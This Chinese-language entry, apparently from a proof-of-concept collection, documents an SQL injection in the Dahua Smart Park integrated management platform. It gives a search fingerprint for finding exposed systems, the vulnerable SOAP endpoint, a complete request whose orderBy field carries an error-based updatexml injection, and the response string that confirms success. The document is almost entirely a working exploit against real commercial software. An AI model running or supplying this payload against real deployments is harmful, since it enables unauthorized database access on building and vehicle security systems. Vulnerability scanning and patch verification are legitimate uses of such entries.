# 大华智慧园区综合管理平台getNewStaypointDetailQuerySQL注入漏洞

大华 ｜ SQL注入 ｜ —
- **指纹**：`app="dahua-智慧园区综合管理平台"`
- **请求**：`POST /portal/services/carQuery/getNewStaypointDetailQuery HTTP/1.1`

**Payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:car="http://carQuery.webservice.dssc.dahua.com">
<soapenv:Header/>
<soapenv:Body>
<car:getNewStaypointDetailQuery>
<!--type: string-->
<searchJson>{}</searchJson>
<!--type: string-->
<pageJson>{"orderBy":"1 and 1=updatexml(1,concat(0x7e,(select md5(1)),0x7e),1)--"}</pageJson>
<!--type: string-->
<extend>quae divum incedo</extend>
</car:getNewStaypointDetailQuery>
</soapenv:Body>
</soapenv:Envelope>
```
- **响应特征**：200 a0b923820dcc509a